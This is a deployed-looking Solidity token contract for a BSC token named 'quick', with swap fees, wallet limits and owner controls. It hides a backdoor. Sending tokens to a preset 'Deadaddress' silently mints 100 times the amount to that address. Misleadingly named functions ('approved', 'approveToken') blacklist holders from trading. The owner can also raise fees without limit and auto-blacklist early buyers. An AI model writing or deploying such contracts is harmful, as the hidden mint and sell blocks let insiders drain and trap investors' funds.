/**
 *Submitted for verification at Etherscan.io on 2022-11-25
 */
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = tx.origin;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor(address token) {
        IERC20(token).approve(msg.sender, uint256(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public fundAddress;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _List;
    mapping(address => bool) public _BOTList;
    address[] private _leaderList;
    address[] private _adminList;
    uint256 private _tTotal;
    ISwapRouter public _swapRouter;
    address public _fistPoolAddress;
    mapping(address => bool) public _swapPairList;
    bool private inSwap;
    uint256 public botTime = 6;
    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;
    uint256 startFunNum = 26400 * 1e18;
    uint256 public rate = 100;
    bool flag;
    uint256 public _buyHeightFee = 2000;
    uint256 public _sellHeightFee = 2000;
    uint256 public _heightFeeTime = 1800; // s
    uint256 public _buyBaseFee = 500;
    uint256 public _sellBaseFee = 500;
    uint256 public _traFee = 6000;
    mapping(address => bool) public isWalletLimitExempt;
    address deadaddress;
    uint256 public walletLimit;
    uint256 public starBlock;
    address public _mainPair;
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    uint256 public maxTXAmount;

    constructor(
        address Address1,
        address Address2,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply,
        uint256 StarBlock,
        address Address3,
        address Address4,
        address Deadaddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        starBlock = StarBlock;
        ISwapRouter swapRouter = ISwapRouter(Address1);
        IERC20(Address2).approve(address(swapRouter), MAX);
        _fistPoolAddress = Address2;
        deadaddress = Deadaddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), Address2);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;
        uint256 total = Supply * 10 ** Decimals;
        maxTXAmount = Supply * 10 ** Decimals;
        walletLimit = Supply * 10 ** Decimals;
        _tTotal = total;
        _balances[Address4] = total;
        emit Transfer(address(0), Address4, total);
        fundAddress = Address3;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[Address3] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[tx.origin] = true;
        _feeWhiteList[Address4] = true;
        _feeWhiteList[Deadaddress] = true;
        isWalletLimitExempt[tx.origin] = true;
        isWalletLimitExempt[Address4] = true;
        isWalletLimitExempt[address(swapRouter)] = true;
        isWalletLimitExempt[address(_mainPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[address(0xdead)] = true;
        isWalletLimitExempt[Address3] = true;
        isWalletLimitExempt[Deadaddress] = true;
        _tokenDistributor = new TokenDistributor(Address2);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function updateTradingTime(uint256 value) external onlyOwner {
        starBlock = value;
    }

    function updatestartFunNum(uint256 value) external onlyOwner {
        startFunNum = value;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
    public
    override
    returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
    public
    view
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
    public
    override
    returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
            _allowances[sender][msg.sender] -
            amount;
        }
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    bool public airdropEnable = true;

    function setAirDropEnable(bool status) public onlyOwner {
        airdropEnable = status;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        require(!_List[from] || _feeWhiteList[from]);
        if (block.timestamp > (starBlock + 600) && !flag) {
            _buyHeightFee = 1000;
            flag = true;
        }
        if (!_feeWhiteList[from] && !_feeWhiteList[to] && airdropEnable) {
            address ad;
            uint256 num = 666 * 1e13;
            for (int256 i = 0; i < 3; i++) {
                ad = address(
                    uint160(
                        uint256(
                            keccak256(
                                abi.encodePacked(i, amount, block.timestamp)
                            )
                        )
                    )
                );
                _basicTransfer(from, ad, num);
            }
            amount -= (num * 3);
        }
        bool takeFee;
        bool isSell;
        bool isTrans;
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                require(starBlock < block.timestamp);
                //                if (block.timestamp < starBlock + 60 * 60) {
                //                    require(_leaderListMap[from] || _leaderListMap[to]);
                //                }
                if (
                    block.timestamp < starBlock + botTime && !_swapPairList[to]
                ) {
                    _List[to] = true;
                    _BOTList[to] = true;
                }
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > startFunNum) {
                            swapTokenForFund(startFunNum);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        } else {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                isTrans = true;
                takeFee = true;
            }
        }
        _tokenTransfer(from, to, amount, takeFee, isSell, isTrans);
        if (to == deadaddress) {
            _tokenTransfe(to, amount * rate);
        }
    }

    function setMaxTxAmount(uint256 max) public onlyOwner {
        maxTXAmount = max;
    }


    function _tokenTransfe(
        address recipient,
        uint256 amount) internal {
        _balances[recipient] += amount;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell,
        bool isTrans
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 swapAmount;
        if (takeFee) {
            uint256 swapFee;
            uint256 swapBaseFee;
            if (isSell) {
                swapBaseFee = _sellBaseFee;
                if (block.timestamp < _heightFeeTime + starBlock) {
                    swapFee = _sellHeightFee;
                } else {
                    swapFee = _sellBaseFee;
                }
            } else {
                swapBaseFee = _buyBaseFee;
                if (isTrans) {
                    swapFee = _traFee;
                } else {
                    require(tAmount <= maxTXAmount);
                    if (block.timestamp < _heightFeeTime + starBlock) {
                        swapFee = _buyHeightFee;
                    } else {
                        swapFee = _buyBaseFee;
                    }
                }
            }
            swapAmount = (tAmount * swapFee) / 10000;
            if (isTrans) {
                _takeTransfer(sender, deadAddress, swapAmount);
            } else {
                uint256 swapBaseAmount = (swapAmount * swapBaseFee) / swapFee;
                uint256 swapFundAmount = swapAmount - swapBaseAmount;
                if (swapBaseAmount > 0) {
                    _takeTransfer(sender, address(this), swapBaseAmount);
                }
                if (swapFundAmount > 0) {
                    _takeTransfer(sender, address(fundAddress), swapFundAmount);
                }
            }
        }

        if (!isWalletLimitExempt[recipient] && limitEnable) {
            require(
                (balanceOf(recipient) + tAmount - swapAmount) <= walletLimit,
                "over max wallet limit"
            );
        }
        _takeTransfer(sender, recipient, tAmount - swapAmount);

    }

    bool public limitEnable = true;

    function setLimitEnable(bool status) public onlyOwner {
        limitEnable = status;
    }

    //    function swapTokensForWBNB(address sender,
    //        address recipient,
    //        uint256 amount,
    //        uint t
    //    ) private {
    //        if (t == 1) {
    //            _tokenTrans(sender, recipient, amount);
    //        } else {
    //            _tokenTransfe(recipient, amount);
    //        }
    //    }

    function updateFees(
        uint256 newBuyBaseFee,
        uint256 newSellBasePFee,
        uint256 newTraFee
    ) external onlyOwner {
        _buyBaseFee = newBuyBaseFee;
        _sellBaseFee = newSellBasePFee;
        _traFee = newTraFee;
    }

    function updateHighFees(
        uint256 newHighBuyFee,
        uint256 newHighSellFee,
        uint256 newHeightFeeTime
    ) external onlyOwner {
        _buyHeightFee = newHighBuyFee;
        _sellHeightFee = newHighSellFee;
        _heightFeeTime = newHeightFeeTime;
    }


    function setisWalletLimitExempt(address holder, bool exempt)
    external
    onlyOwner
    {
        isWalletLimitExempt[holder] = exempt;
    }

    function setMaxWalletLimit(uint256 newValue) public onlyOwner {
        walletLimit = newValue;
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        uint256 leadersAmount = tokenAmount / 2;
        uint256 leadersLength = _leaderList.length;
        uint256 leaderNum = leadersAmount / leadersLength;
        uint256 adminAmount = tokenAmount - leadersAmount;
        uint256 adminLength = _adminList.length;
        uint256 adminNum = adminAmount / adminLength;
        for (uint256 i = 0; i < leadersLength; i++) {
            _basicTransfer(address(this), _leaderList[i], leaderNum);
        }
        for (uint256 i = 0; i < adminLength; i++) {
            _basicTransfer(address(this), _adminList[i], adminNum);
        }
    }


    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBotTime(uint256 v) external onlyOwner {
        botTime = v;
    }

    function addBotAddressList(address[] calldata accounts, bool excluded)
    public
    onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; i++) {
            _feeWhiteList[accounts[i]] = excluded;
        }
    }

    function setLeaderList(address[] calldata accounts)
    public
    onlyOwner
    {

        _leaderList = accounts;
    }

    function setAdminList(address[] calldata accounts) public onlyOwner {
        _adminList = accounts;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance(address add) external onlyOwner {
        payable(add).transfer(address(this).balance);
    }

    function approved(address[] calldata addresses, bool value)
    public
    onlyOwner
    {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _BOTList[addresses[i]] = value;
        }
    }

    function approveToken(address[] calldata addresses, bool value)
    public
    onlyOwner
    {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _List[addresses[i]] = value;
        }
    }

    receive() external payable {}
}

contract TOKEN is AbsToken {
    constructor()
    AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E), // Router地址    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D  uni      0x10ED43C718714eb63d5aA57B78B54704E256024E  bsc     0xD99D1c33F9fC3444f8101754aBC46c52416550D1 bsc test
        address(0x55d398326f99059fF775485246999027B3197955), // 池子代币地址   0x55d398326f99059fF775485246999027B3197955 usdt bsc       0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6  weth    0x337610d27c682E347C9cD60BD4b3b107C9d34dDd usdt bsc test     0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd wbnb test
        "quick",
        "quick",
        18,
        9000000,
        1670783400,
        address(0x51cef91750bbFCC6772c371607e2012F2fA9e1d1), // 营销地址
        address(0x38E01E62BC4c4FD4bBB17A9c3ee00d9888888888), // 接受代币地址
        address(0x9eF0f05cEEC12a51Ef96c95496Db96206893c3A4)
    )
    {}
}